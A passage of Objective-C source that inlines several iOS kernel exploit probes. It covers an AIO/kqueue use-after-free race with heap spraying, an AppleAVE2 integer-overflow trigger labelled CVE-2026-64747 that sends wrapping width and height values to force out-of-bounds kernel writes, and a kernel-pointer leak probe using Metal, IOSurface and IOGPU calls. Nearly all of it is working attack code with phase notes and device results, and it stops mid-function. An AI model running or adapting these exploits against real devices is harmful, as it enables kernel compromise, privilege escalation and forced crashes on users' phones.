    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *lp = [docs stringByAppendingPathComponent:@"aio_uaf_log.txt"];
    int logfd = open([lp UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);
    #define ALOG(...) do { if (logfd >= 0) { char _lb[320]; int _n = snprintf(_lb, sizeof(_lb), __VA_ARGS__); write(logfd, _lb, _n); fcntl(logfd, F_FULLFSYNC); } } while (0)
    [out appendFormat:@"logfile: %s (fd=%d)\n", [lp UTF8String], logfd];
    ALOG("START aio-uaf-v4c\n");

    v4_pin(7);

    NSString *fp = [docs stringByAppendingPathComponent:@"aio_backing.bin"];
    int file = open([fp UTF8String], O_CREAT | O_RDWR | O_TRUNC, 0644);
    if (file < 0) { [out appendFormat:@"STOP open file errno=%d\n", errno]; return out; }
    uint8_t wbuf[4096]; memset(wbuf, 0x61, sizeof(wbuf));
    write(file, wbuf, sizeof(wbuf));
    g_v4_file = file;

    g_v4_stop = 0;
    g_v4_lookup = -1;
    g_v4_do_close = 0;
    pthread_t closer;
    if (pthread_create(&closer, NULL, v4_closer, NULL) != 0) {
        [out appendString:@"STOP pthread_create closer\n"];
        return out;
    }

    long n_eagain = 0, n_ok = 0, n_einval = 0, n_eother = 0, n_occ_fail = 0;
    struct aiocb spray[AIO_SPRAY];
    struct aiocb occ;

    for (long it = 0; it < AIO_ITERS; it++) {
        v4_fill_none(&occ);
        if (v4_read(&occ) != 0) {
            n_occ_fail++;
            v4_reap(&occ);
            continue;
        }

        int kq = kqueue();
        if (kq < 0) { v4_reap(&occ); n_eother++; continue; }
        int keep = dup(kq);
        if (keep < 0) { close(kq); v4_reap(&occ); n_eother++; continue; }

        g_v4_lookup = kq;
        __atomic_store_n(&g_v4_do_close, 1, __ATOMIC_RELEASE);

        v4_fill_kevent(&occ, kq);
        int rc = v4_read(&occ);
        int saved = errno;

        __atomic_store_n(&g_v4_do_close, 0, __ATOMIC_RELEASE);
        if (g_v4_lookup == kq) {
            g_v4_lookup = -1;
            close(kq);
        }

        if (rc == 0) n_ok++;
        else if (saved == EAGAIN) n_eagain++;
        else if (saved == EINVAL) n_einval++;
        else n_eother++;

        // occupant no longer needed for duplicate; free the slot for churn
        v4_reap(&occ);

        if (!(rc != 0 && saved == EAGAIN)) {
            close(keep);
            continue;
        }

        if ((it % 5) == 0) {
            [out appendFormat:@"  it=%ld eagain=%ld churning %d x %d\n",
                it, n_eagain, AIO_CHURN, AIO_SPRAY];
            ALOG("it=%ld eagain=%ld start-churn\n", it, n_eagain);
        }

        // drain quarantine: alloc+reap, do NOT leave objects live until the end
        for (int c = 0; c < AIO_CHURN; c++) {
            v4_burst_alloc(spray, AIO_SPRAY);
            v4_burst_reap(spray, AIO_SPRAY);
        }

        // final occupants of the zone — leave LIVE on doneq
        int ns = v4_burst_alloc(spray, AIO_SPRAY);
        ALOG("it=%ld churn-done spray-armed close(keep) ns=%d eagain=%ld\n",
             it, ns, n_eagain);
        close(keep);

        for (int i = 0; i < AIO_SPRAY; i++) v4_reap(&spray[i]);
    }

    g_v4_stop = 1;
    pthread_join(closer, NULL);
    close(g_v4_file);

    [out appendFormat:@"\n=== SURVIVED %d iters eagain=%ld ok=%ld einval=%ld other=%ld occ_fail=%ld ===\n",
        AIO_ITERS, n_eagain, n_ok, n_einval, n_eother, n_occ_fail];
    [out appendFormat:@"closes=%ld churn=%d x %d per iter\n", g_v4_closes, AIO_CHURN, AIO_SPRAY];
    [out appendString:@"PANIC still-enqueued after spray-armed => CHURN reclaimed the knote slot.\n"];
    [out appendString:@"PANIC os_refcnt underflow => slot still quarantined / churn missed.\n"];
    ALOG("SURVIVED aio-uaf-v4c eagain=%ld closes=%ld\n", n_eagain, g_v4_closes);
    if (logfd >= 0) close(logfd);
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}
// ==== END AIOUAFProbe.inc.h ====

// ==== BEGIN inlined AVE64747.inc.h ====
// AVE64747.inc — CVE-2026-64747 AppleAVE2 integer-overflow probe.
//
// PRIMARY TARGET: iPhone13,2 A14 iOS 26.5 / 23F77
// Device result (2026-08-20): all IOServiceOpen types → 0xe00002e2 NotPermitted
// (same sandbox as iPad/XR). Treat Phase A map as open/type/sel inventory;
// do NOT run overflow unless open==0.
//
// Legacy: XR 18.7.5 / 22H311 also NotPermitted for AVE from app in practice
// on some builds; KC had unguarded size-calc family (research notes).
//
// Phases:
//   A runAVE64747Map      SAFE    — open + type sweep + sel×size sweep.
//   B runAVE64747Control  SAFE    — benign 1280x720 at candidate w/h offs.
//   C runAVE64747Overflow PANIC-RISK — only if A open succeeded.
//
// Interpretation:
//   Phase A: 0xe00002e2 at open  => sandbox gate => pivot (VT / other).
//   Phase B: benign dims OK at offset pair X  => w/h live at X.
//   Phase C: panic at (sel, offset) => path pinned. Do not re-tap.

typedef CFMutableDictionaryRef (*A647_IOServiceMatching_t)(const char *);
typedef io_service_t (*A647_IOServiceGetMatchingService_t)(mach_port_t, CFDictionaryRef);
typedef kern_return_t (*A647_IOServiceOpen_t)(io_service_t, task_port_t, uint32_t, io_connect_t *);
typedef kern_return_t (*A647_IOServiceClose_t)(io_connect_t);
typedef kern_return_t (*A647_IOObjectRelease_t)(io_object_t);
typedef kern_return_t (*A647_IOConnectCallStructMethod_t)(mach_port_t, uint32_t,
                                                          const void *, size_t,
                                                          void *, size_t *);

// Candidate width/height offset pairs in the UC input struct.
// 0xd98/0xd9c = 23F77 iPad Start path (pInfo+0xa58/+0xa5c, pInfo=user_in+0x340)
// 0xa58/0xa5c = info-blob direct; 0xa70/0xa74 = JPEG-probe Start fields;
// 0x18/0x1c, 0x20/0x24 = common early header slots.
static const size_t kA647DimOffsets[][2] = {
    {0xd98, 0xd9c},
    {0xa58, 0xa5c},
    {0xa70, 0xa74},
    {0x18,  0x1c},
    {0x20,  0x24},
    {0x28,  0x2c},
};
static const int kA647NDimOffsets = 6;

// Candidate struct sizes: A12X 26.6 dispatch had sel0=0x920, sel3 up to
// 0x1a0a0; A12/18.7.5 unknown — sweep to find acceptance boundary.
static const size_t kA647Sizes[] = {0x40, 0x100, 0x400, 0x920, 0x1000, 0x2000, 0x8000, 0x1a0a0};
static const int kA647NSizes = 8;

static void a647Log(int fd, NSMutableString *out, NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    [out appendString:line]; [out appendString:@"\n"];
    if (fd >= 0) {
        const char *s = [line UTF8String];
        write(fd, s, strlen(s)); write(fd, "\n", 1);
        fcntl(fd, F_FULLFSYNC);
    }
}

static int a647OpenLog(NSString *name, NSMutableString *out) {
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *lp = [docs stringByAppendingPathComponent:name];
    int fd = open([lp UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);
    a647Log(fd, out, @"logfile: %@", lp);
    return fd;
}

static BOOL a647Resolve(void **iokit,
                        A647_IOServiceMatching_t *pm, A647_IOServiceGetMatchingService_t *pg,
                        A647_IOServiceOpen_t *po, A647_IOServiceClose_t *pc,
                        A647_IOObjectRelease_t *pr, A647_IOConnectCallStructMethod_t *pcs,
                        mach_port_t *mainPort) {
    *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!*iokit) return NO;
    *pm  = dlsym(*iokit, "IOServiceMatching");
    *pg  = dlsym(*iokit, "IOServiceGetMatchingService");
    *po  = dlsym(*iokit, "IOServiceOpen");
    *pc  = dlsym(*iokit, "IOServiceClose");
    *pr  = dlsym(*iokit, "IOObjectRelease");
    *pcs = dlsym(*iokit, "IOConnectCallStructMethod");
    mach_port_t *pmp = dlsym(*iokit, "kIOMainPortDefault");
    if (!pmp) pmp = dlsym(*iokit, "kIOMasterPortDefault");
    if (!*pm || !*pg || !*po || !*pc || !*pr || !*pcs || !pmp) return NO;
    *mainPort = *pmp;
    return YES;
}

static io_service_t a647FindService(A647_IOServiceMatching_t pm,
                                    A647_IOServiceGetMatchingService_t pg,
                                    mach_port_t mainPort,
                                    NSMutableString *out, int fd) {
    const char *names[] = {"AppleAVE2Driver", "AppleAVE2", "AppleAVE2UserClient"};
    for (int i = 0; i < 3; i++) {
        io_service_t s = pg(mainPort, pm(names[i]));
        if (s) { a647Log(fd, out, @"match %s: FOUND (%u)", names[i], s); return s; }
        a647Log(fd, out, @"match %s: none", names[i]);
    }
    return 0;
}

static const char *a647KR(kern_return_t kr) {
    switch ((unsigned)kr) {
        case 0x00000000: return "OK";
        case 0xe00002bc: return "Error";
        case 0xe00002c2: return "BadArgument";
        case 0xe00002c7: return "NotPrivileged";
        case 0xe00002cc: return "NoSpace/02cc";
        case 0xe00002e2: return "NotPermitted";
        case 0xe00002d5: return "NotReady";
        case 0x10000003: return "MIG bad-conn";
        default: return "?";
    }
}

// ---------------------------------------------------------------------------
// Phase A — dispatch map (SAFE)
// ---------------------------------------------------------------------------
#undef ALOG

+ (NSString *)runAVE64747Map {
    NSMutableString *out = [NSMutableString string];
    int fd = a647OpenLog(@"ave64747_map_log.txt", out);
    a647Log(fd, out, @"=== ave47map session: 64747 phase A: AVE2 UC dispatch map (SAFE) ===");
    a647Log(fd, out, @"time %@", [NSDate date]);

    void *iokit; A647_IOServiceMatching_t pm; A647_IOServiceGetMatchingService_t pg;
    A647_IOServiceOpen_t po; A647_IOServiceClose_t pc; A647_IOObjectRelease_t pr;
    A647_IOConnectCallStructMethod_t pcs; mach_port_t mainPort;
    if (!a647Resolve(&iokit, &pm, &pg, &po, &pc, &pr, &pcs, &mainPort)) {
        a647Log(fd, out, @"STOP dlsym"); if (fd>=0) close(fd); return out;
    }

    io_service_t svc = a647FindService(pm, pg, mainPort, out, fd);
    if (!svc) { a647Log(fd, out, @"STOP no AVE service"); if (fd>=0) close(fd); return out; }

    // Type sweep — keep first working connection.
    io_connect_t conn = 0; uint32_t openType = 0xffffffff;
    for (uint32_t t = 0; t <= 4; t++) {
        io_connect_t c = 0;
        kern_return_t kr = po(svc, mach_task_self(), t, &c);
        a647Log(fd, out, @"IOServiceOpen type=%u -> 0x%08x (%s)%@", t, (unsigned)kr,
                a647KR(kr), (kr == KERN_SUCCESS && c) ? @" SUCCESS" : @"");
        if (kr == KERN_SUCCESS && c) {
            if (!conn) { conn = c; openType = t; } else pc(c);
        }
    }
    pr(svc);
    if (!conn) {
        a647Log(fd, out, @"STOP: no openable type — if all NotPermitted, sandbox gate");
        a647Log(fd, out, @"exists on this build; pivot to VT entry (AVEVTSmoke).");
        if (fd>=0) close(fd); return out;
    }
    a647Log(fd, out, @"using conn=%u type=%u", conn, openType);

    // Selector x size sweep with zeroed struct. Wrong size -> BadArgument;
    // accepted size reaches the handler and returns something else.
    size_t maxSz = 0x1a0a0;
    uint8_t *buf = calloc(1, maxSz);
    uint8_t *obuf = calloc(1, 0x1000);
    if (!buf || !obuf) { a647Log(fd, out, @"STOP calloc"); pc(conn); if (fd>=0) close(fd); return out; }

    for (uint32_t sel = 0; sel <= 15; sel++) {
        a647Log(fd, out, @"--- sel=%u ---", sel);
        for (int i = 0; i < kA647NSizes; i++) {
            size_t sz = kA647Sizes[i];
            memset(buf, 0, sz);
            size_t oc = 0x1000; memset(obuf, 0, 0x1000);
            kern_return_t r = pcs(conn, sel, buf, sz, obuf, &oc);
            a647Log(fd, out, @"  size=0x%-6zx -> 0x%08x (%s) outCnt=%zu",
                    sz, (unsigned)r, a647KR(r), oc);
        }
    }

    free(buf); free(obuf);
    pc(conn);
    a647Log(fd, out, @"DONE — paste back. Read: non-BadArgument sizes = real dispatch entries.");
    if (fd>=0) close(fd);
    return out;
}

// ---------------------------------------------------------------------------
// Phase B — benign-dims control (SAFE): prove which sel+offset the kernel reads
// ---------------------------------------------------------------------------
+ (NSString *)runAVE64747Control {
    NSMutableString *out = [NSMutableString string];
    int fd = a647OpenLog(@"ave64747_control_log.txt", out);
    a647Log(fd, out, @"=== ave47ctl session: 64747 phase B: benign dims 1280x720 (SAFE) ===");
    a647Log(fd, out, @"time %@", [NSDate date]);

    void *iokit; A647_IOServiceMatching_t pm; A647_IOServiceGetMatchingService_t pg;
    A647_IOServiceOpen_t po; A647_IOServiceClose_t pc; A647_IOObjectRelease_t pr;
    A647_IOConnectCallStructMethod_t pcs; mach_port_t mainPort;
    if (!a647Resolve(&iokit, &pm, &pg, &po, &pc, &pr, &pcs, &mainPort)) {
        a647Log(fd, out, @"STOP dlsym"); if (fd>=0) close(fd); return out;
    }
    io_service_t svc = a647FindService(pm, pg, mainPort, out, fd);
    if (!svc) { a647Log(fd, out, @"STOP no service"); if (fd>=0) close(fd); return out; }
    io_connect_t conn = 0;
    kern_return_t kr = po(svc, mach_task_self(), 0, &conn);
    pr(svc);
    if (kr != KERN_SUCCESS || !conn) {
        a647Log(fd, out, @"STOP open 0x%08x (%s)", (unsigned)kr, a647KR(kr));
        if (fd>=0) close(fd); return out;
    }
    a647Log(fd, out, @"conn=%u", conn);

    // Sels 0..5 at their phase-A-accepted sizes are the Prepare/Start candidates.
    // Use the largest struct so every candidate offset fits.
    size_t maxSz = 0x1a0a0;
    uint8_t *buf = calloc(1, maxSz);
    uint8_t *obuf = calloc(1, 0x1000);
    if (!buf || !obuf) { a647Log(fd, out, @"STOP calloc"); pc(conn); if (fd>=0) close(fd); return out; }

    for (uint32_t sel = 0; sel <= 5; sel++) {
        for (int o = 0; o < kA647NDimOffsets; o++) {
            size_t wo = kA647DimOffsets[o][0], ho = kA647DimOffsets[o][1];
            memset(buf, 0, maxSz);
            *(uint32_t *)(buf + wo) = 1280;
            *(uint32_t *)(buf + ho) = 720;
            a647Log(fd, out, @"CHK sel=%u w@0x%zx h@0x%zx = 1280x720", sel, wo, ho);
            size_t oc = 0x1000; memset(obuf, 0, 0x1000);
            kern_return_t r = pcs(conn, sel, buf, maxSz, obuf, &oc);
            a647Log(fd, out, @"  -> 0x%08x (%s) outCnt=%zu", (unsigned)r, a647KR(r), oc);
        }
    }

    free(buf); free(obuf);
    pc(conn);
    a647Log(fd, out, @"DONE — paste back. (sel,offset) with OK/new code = dims are read there.");
    if (fd>=0) close(fd);
    return out;
}

// ---------------------------------------------------------------------------
// Phase C — overflow trigger (PANIC RISK — the actual 64747 confirmation)
//
// Wrapping dim pairs chosen against the A12 calc shape:
//   calcA: ((w+0xf)>>4) * ((h+7)>>3) * ((d+7)>>3) << 7   (all mod 2^32)
//   calcG: signed-rounded luma + chroma sum, signed dims accepted
// Pairs below wrap the 32-bit product to a SMALL positive value -> tiny alloc,
// while the pixel count the engine must process is huge -> deterministic OOB
// write once encode touches the buffer.
// ---------------------------------------------------------------------------
+ (NSString *)runAVE64747Overflow {
    NSMutableString *out = [NSMutableString string];
    int fd = a647OpenLog(@"ave64747_overflow_log.txt", out);
    a647Log(fd, out, @"=== ave47ovf session: 64747 phase C: WRAPPING DIMS — PANIC RISK ===");
    a647Log(fd, out, @"time %@", [NSDate date]);
    a647Log(fd, out, @"If device panics: DO NOT re-tap. Panic log + this file = confirmation.");

    void *iokit; A647_IOServiceMatching_t pm; A647_IOServiceGetMatchingService_t pg;
    A647_IOServiceOpen_t po; A647_IOServiceClose_t pc; A647_IOObjectRelease_t pr;
    A647_IOConnectCallStructMethod_t pcs; mach_port_t mainPort;
    if (!a647Resolve(&iokit, &pm, &pg, &po, &pc, &pr, &pcs, &mainPort)) {
        a647Log(fd, out, @"STOP dlsym"); if (fd>=0) close(fd); return out;
    }
    io_service_t svc = a647FindService(pm, pg, mainPort, out, fd);
    if (!svc) { a647Log(fd, out, @"STOP no service"); if (fd>=0) close(fd); return out; }
    io_connect_t conn = 0;
    kern_return_t kr = po(svc, mach_task_self(), 0, &conn);
    pr(svc);
    if (kr != KERN_SUCCESS || !conn) {
        a647Log(fd, out, @"STOP open 0x%08x (%s)", (unsigned)kr, a647KR(kr));
        if (fd>=0) close(fd); return out;
    }
    a647Log(fd, out, @"conn=%u", conn);

    size_t maxSz = 0x1a0a0;
    uint8_t *buf = calloc(1, maxSz);
    uint8_t *obuf = calloc(1, 0x1000);
    if (!buf || !obuf) { a647Log(fd, out, @"STOP calloc"); pc(conn); if (fd>=0) close(fd); return out; }

    // (w,h) pairs: each wraps the 32-bit rounded product.
    //  0x10000x0x10000: (4097)*(8193)*(8193) mod 2^32 = 0x90201001 -> huge but
    //                   intermediate wraps exercise every calc variant.
    //  0x4000x0x4000000 etc. give small-positive wrapped totals on calcA shape.
    static const struct { uint32_t w, h; } pairs[] = {
        {0x10000,    0x10000},
        {0x4000,     0x4000000},
        {0x7fff0000, 0x7fff0000},
        {0x80000000, 0x80000000},  // negative as signed — calcG csel path
    };
    static const int npairs = 4;

    for (uint32_t sel = 0; sel <= 5; sel++) {
        for (int o = 0; o < kA647NDimOffsets; o++) {
            for (int p = 0; p < npairs; p++) {
                size_t wo = kA647DimOffsets[o][0], ho = kA647DimOffsets[o][1];
                memset(buf, 0, maxSz);
                *(uint32_t *)(buf + wo) = pairs[p].w;
                *(uint32_t *)(buf + ho) = pairs[p].h;
                // Checkpoint BEFORE the call — if the device dies here, this
                // line is on disk and names the exact (sel, offset, dims).
                a647Log(fd, out, @"CHK FIRE sel=%u w@0x%zx=0x%x h@0x%zx=0x%x",
                        sel, wo, pairs[p].w, ho, pairs[p].h);
                size_t oc = 0x1000; memset(obuf, 0, 0x1000);
                kern_return_t r = pcs(conn, sel, buf, maxSz, obuf, &oc);
                a647Log(fd, out, @"  -> 0x%08x (%s) outCnt=%zu", (unsigned)r, a647KR(r), oc);
            }
        }
    }

    free(buf); free(obuf);
    pc(conn);
    a647Log(fd, out, @"DONE no panic — dims rejected or wrong offsets; paste log back.");
    a647Log(fd, out, @"Next: read phase A map to pick accepted (sel,size) and narrow offsets.");
    if (fd>=0) close(fd);
    return out;
}
// ==== END AVE64747.inc.h ====

// ==== BEGIN inlined IOPLLeakProbe.inc.h ====
// IOPLLeakProbe v7 — CVE-2026-65349 vm_object_iopl_request OOB read.
//
// Cite: xnu 26.6 / 26.6.1 patch twin. On A14 23F77 (26.5) this may be
// pre-patch OR a different shape — treat HIT as interesting, miss as
// inconclusive for 26.5. Do not paste 26.6 VAs as 23F77 truth.
// UI: "26.6 cite; run on 26.5" = inventory, not guaranteed live.
//
// v7: Metal shared/private/0x82 + sel8 resType 0x80 size/VA mismatch.

static int iopl_scan_buf(const uint8_t *buf, size_t len, const char *tag,
                         uint64_t expect, NSMutableString *out, int logfd) {
    int kptr = 0, foreign = 0;
    uint64_t first = 0;
    if (len >= 8) memcpy(&first, buf, 8);
    for (size_t i = 0; i + 8 <= len; i += 8) {
        uint64_t v; memcpy(&v, buf + i, 8);
        if (v != expect) foreign++;
        if (v >= 0xffffffe000000000ULL) {
            if (kptr < 12)
                [out appendFormat:@"    [%s] +0x%zx: 0x%016llx\n", tag, i,
                    (unsigned long long)v];
            kptr++;
        }
    }
    [out appendFormat:@"  %s foreign=%d kptrs=%d first=0x%016llx\n", tag, foreign, kptr,
        (unsigned long long)first];
    if (logfd >= 0) {
        char lb[220];
        int n = snprintf(lb, sizeof(lb), "  %s foreign=%d kptrs=%d first=0x%llx\n",
                         tag, foreign, kptr, (unsigned long long)first);
        write(logfd, lb, n); fcntl(logfd, F_FULLFSYNC);
        if (kptr) {
            n = snprintf(lb, sizeof(lb), "HIT %s kptrs=%d\n", tag, kptr);
            write(logfd, lb, n); fcntl(logfd, F_FULLFSYNC);
        }
    }
    return kptr;
}

static void iopl_note(int logfd, NSMutableString *out, const char *fmt, ...) {
    char lb[320];
    va_list ap; va_start(ap, fmt);
    int n = vsnprintf(lb, sizeof(lb), fmt, ap);
    va_end(ap);
    if (n > 0) {
        [out appendString:[NSString stringWithUTF8String:lb]];
        if (logfd >= 0) { write(logfd, lb, (size_t)n); fcntl(logfd, F_FULLFSYNC); }
    }
}

static int iopl_scan_maybe(const void *p, size_t len, const char *tag,
                           uint64_t expect, NSMutableString *out, int logfd) {
    if (!p || len < 8) {
        iopl_note(logfd, out, "  %s SKIP ptr=%p len=0x%zx\n", tag, p, len);
        return 0;
    }
    return iopl_scan_buf((const uint8_t *)p, len, tag, expect, out, logfd);
}

static void *iopl_resource_ref(id buf) {
    if (!buf) return NULL;
    for (int i = 0; i < 8; i++) {
        NSString *cn = NSStringFromClass([buf class]);
        if (![cn containsString:@"Capture"] && ![cn containsString:@"Debug"]) break;
        SEL sel = NSSelectorFromString(@"baseObject");
        if (![buf respondsToSelector:sel]) break;
        id base = ((id (*)(id, SEL))objc_msgSend)(buf, sel);
        if (!base || base == buf) break;
        buf = base;
    }
    SEL sel = NSSelectorFromString(@"resourceRef");
    if (![buf respondsToSelector:sel]) return NULL;
    return ((void *(*)(id, SEL))objc_msgSend)(buf, sel);
}

static int iopl_blit_scan(id<MTLDevice> device, id src, size_t len, uint64_t expect,
                          const char *tag, NSMutableString *out, int logfd) {
    if (!device || !src || len < 8) return 0;
    size_t cap = len > 0x4000 ? 0x4000 : len;
    id dst = [device newBufferWithLength:cap options:MTLResourceStorageModeShared];
    id<MTLCommandQueue> q = [device newCommandQueue];
    if (!dst || !q) {
        iopl_note(logfd, out, "  %s blit alloc FAIL\n", tag);
        return 0;
    }
    memset([dst contents], 0xCC, cap);
    id<MTLCommandBuffer> cb = [q commandBuffer];
    id<MTLBlitCommandEncoder> blit = [cb blitCommandEncoder];
    [blit copyFromBuffer:src sourceOffset:0 toBuffer:dst destinationOffset:0 size:cap];
    [blit endEncoding];
    [cb commit];
    [cb waitUntilCompleted];
    iopl_note(logfd, out, "  %s blit status=%ld\n", tag, (long)cb.status);
    return iopl_scan_maybe([dst contents], cap, tag, expect, out, logfd);
}

static int iopl_sel8_80(IOConnectCallMethod_t pCall, io_connect_t conn,
                        uint64_t start, uint64_t end, uint64_t size,
                        const char *tag, NSMutableString *out, int logfd) {
    uint8_t in[0x400];
    uint8_t ob[0x200];
    memset(in, 0, sizeof(in));
    memset(ob, 0, sizeof(ob));
    *(uint32_t *)(in + 0x00) = 0x80;
    *(uint32_t *)(in + 0x04) = 0;
    *(uint64_t *)(in + 0x38) = start;
    *(uint64_t *)(in + 0x40) = end;
    *(uint64_t *)(in + 0x48) = size;
    size_t inSz = sizeof(in);
    size_t outSz = sizeof(ob);
    iopl_note(logfd, out, "  pre-sel8 %s start=%p end=%p size=0x%llx\n",
              tag, (void *)(uintptr_t)start, (void *)(uintptr_t)end,
              (unsigned long long)size);
    kern_return_t kr = pCall(conn, 8, NULL, 0, in, inSz, NULL, NULL, ob, &outSz);
    iopl_note(logfd, out, "  sel8 %s kr=0x%x outSz=0x%zx\n", tag, kr, outSz);
    if (kr != 0) {
        outSz = sizeof(ob);
        memset(ob, 0, sizeof(ob));
        kr = pCall(conn, 9, NULL, 0, in, inSz, NULL, NULL, ob, &outSz);
        iopl_note(logfd, out, "  sel9-fallback %s kr=0x%x outSz=0x%zx\n", tag, kr, outSz);
    }
    if (kr != 0) return -1;

    uint64_t gpuva = 0, cmap = 0, osz = 0, off = 0;
    uint32_t rid = 0;
    if (outSz >= 8) memcpy(&gpuva, ob + 0x00, 8);
    if (outSz >= 16) memcpy(&cmap, ob + 0x08, 8);
    if (outSz >= 0x28) memcpy(&rid, ob + 0x24, 4);
    if (outSz >= 0x50) memcpy(&osz, ob + 0x48, 8);
    if (outSz >= 0x58) memcpy(&off, ob + 0x50, 8);
    iopl_note(logfd, out,
              "  %s id=%u gpuva=0x%llx cmap=0x%llx size=0x%llx off=0x%llx\n",
              tag, rid, (unsigned long long)gpuva, (unsigned long long)cmap,
              (unsigned long long)osz, (unsigned long long)off);

    int kptr = 0;
    size_t dumpn = outSz > 0x80 ? 0x80 : outSz;
    kptr += iopl_scan_maybe(ob, dumpn, tag, 0, out, logfd);

    uintptr_t map = (uintptr_t)cmap;
    if (map > 0x100000000ULL && map < 0x300000000ULL) {
        size_t nscan = (size_t)size;
        if (nscan < 0x1000) nscan = 0x1000;
        if (nscan > 0x10000) nscan = 0x10000;
        kptr += iopl_scan_maybe((const void *)map, nscan, "cmap", 0x4141414141414141ULL,
                                out, logfd);
    }
    return kptr;
}

+ (NSString *)runIOPLLeak {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== IOPL legal-path smoke (NOT 64749 / NOT 65349) ===\n"];
    [out appendString:@"23F77 vm_object_iopl_request @ 0xfffffff009f0377c — this tap does not call it.\n"];
    [out appendString:@"0x9dd9c24 was a wrong cite. 64749=G71 +195 corrupt; 65349=G83 names+30 read.\n"];
    [out appendString:@"v7: Metal 0x80/0x82 + sel8 0x80 match/mismatch. No MapMemory. Parked.\n\n"];

    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *logPath = [paths[0] stringByAppendingPathComponent:@"iopl_leak_log.txt"];
    int logfd = open(logPath.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);
#define IOPLLOG(...) do { iopl_note(logfd, out, __VA_ARGS__); } while (0)
    IOPLLOG("START iopl-leak-v7\n");

    int n_ok = 0, n_fail = 0, total_kptr = 0;

    @autoreleasepool {
        id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
        IOPLLOG("metal dev=%s\n", mtl ? [[mtl name] UTF8String] : "NULL");
        if (!mtl) n_fail++;
        else {
            const NSUInteger mlen = 0x4000;

            IOPLLOG("-- Metal shared 0x80 --\n");
            id shared = [mtl newBufferWithLength:mlen options:MTLResourceStorageModeShared];
            void *sref = iopl_resource_ref(shared);
            void *scpu = shared ? [shared contents] : NULL;
            IOPLLOG("  shared buf=%p ref=%p cpu=%p\n", shared, sref, scpu);
            if (scpu) {
                memset(scpu, 0x41, mlen);
                n_ok++;
                total_kptr += iopl_scan_maybe(scpu, mlen, "shared-cpu",
                                              0x4141414141414141ULL, out, logfd);
                total_kptr += iopl_blit_scan(mtl, shared, mlen, 0x4141414141414141ULL,
                                             "shared-blit", out, logfd);
            } else n_fail++;

            IOPLLOG("-- Metal private 0x80 --\n");
            id priv = [mtl newBufferWithLength:mlen options:MTLResourceStorageModePrivate];
            void *pref = iopl_resource_ref(priv);
            // Private buffers are GPU-only — [contents] SIGABRTs (Metal assert).
            IOPLLOG("  private buf=%p ref=%p (no CPU contents)\n", priv, pref);
            if (priv) {
                n_ok++;
                total_kptr += iopl_blit_scan(mtl, priv, mlen, 0, "private-blit", out, logfd);
            } else n_fail++;

            IOPLLOG("-- Metal 0x82 IOSurface --\n");
            void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
            IOSurfaceCreate_t pCreate = iosH ? dlsym(iosH, "IOSurfaceCreate") : NULL;
            IOSurfaceGetID_t pGetID = iosH ? dlsym(iosH, "IOSurfaceGetID") : NULL;
            IOSurfaceGetBaseAddress_t pBase = iosH ? dlsym(iosH, "IOSurfaceGetBaseAddress") : NULL;
            IOSurfaceLock_t pLock = iosH ? dlsym(iosH, "IOSurfaceLock") : NULL;
            IOSurfaceUnlock_t pUnlock = iosH ? dlsym(iosH, "IOSurfaceUnlock") : NULL;
            NSDictionary *props = @{
                @"IOSurfaceWidth": @64,
                @"IOSurfaceHeight": @64,
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfaceBytesPerRow": @(64 * 4),
                @"IOSurfaceAllocSize": @(64 * 64 * 4),
                @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
            };
            IOSurfaceRef surf = pCreate ? pCreate((__bridge CFDictionaryRef)props) : NULL;
            IOPLLOG("  surf=%p sid=%u\n", surf, (surf && pGetID) ? pGetID(surf) : 0);
            if (surf) {
                if (pLock) pLock(surf, 0, NULL);
                void *base = pBase ? pBase(surf) : NULL;
                if (base) memset(base, 0x41, 64 * 64 * 4);
                if (pUnlock) pUnlock(surf, 0, NULL);
                SEL nbSel = NSSelectorFromString(@"newBufferWithIOSurface:");
                id ibuf = nil;
                if ([mtl respondsToSelector:nbSel])
                    ibuf = ((id (*)(id, SEL, IOSurfaceRef))objc_msgSend)(mtl, nbSel, surf);
                void *iref = iopl_resource_ref(ibuf);
                IOPLLOG("  iosurf-buf=%p ref=%p\n", ibuf, iref);
                if (ibuf) {
                    n_ok++;
                    total_kptr += iopl_blit_scan(mtl, ibuf, 0x4000, 0x4141414141414141ULL,
                                                 "iosurf-blit", out, logfd);
                } else n_fail++;
                if (base)
                    total_kptr += iopl_scan_maybe(base, 0x4000, "iosurf-cpu",
                                                  0x4141414141414141ULL, out, logfd);
            } else n_fail++;
        }
    }

    IOPLLOG("-- IOGPU sel8 resType 0x80 --\n");
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    IOServiceMatching_t pMatching = iokit ? dlsym(iokit, "IOServiceMatching") : NULL;
    IOServiceGetMatchingService_t pGet = iokit ? dlsym(iokit, "IOServiceGetMatchingService") : NULL;
    IOObjectRelease_t pRelease = iokit ? dlsym(iokit, "IOObjectRelease") : NULL;
    IOConnectCallMethod_t pCall = iokit ? dlsym(iokit, "IOConnectCallMethod") : NULL;
    mach_port_t *pMain = iokit ? dlsym(iokit, "kIOMainPortDefault") : NULL;
    if (!pMain) pMain = iokit ? dlsym(iokit, "kIOMasterPortDefault") : NULL;
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
